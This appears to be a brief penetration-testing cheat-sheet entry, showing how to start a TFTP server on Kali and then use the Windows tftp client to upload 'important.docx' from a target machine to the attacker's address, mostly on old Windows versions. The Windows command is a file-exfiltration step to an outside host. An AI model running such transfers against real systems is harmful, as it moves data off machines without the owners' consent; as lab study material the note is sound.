## On Kali :
```bash
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

## On Windows :
```bat
tftp -i 10.11.0.4 put important.docx
```

### Note : This technique is mostly used on old Windows version (XP, 2003)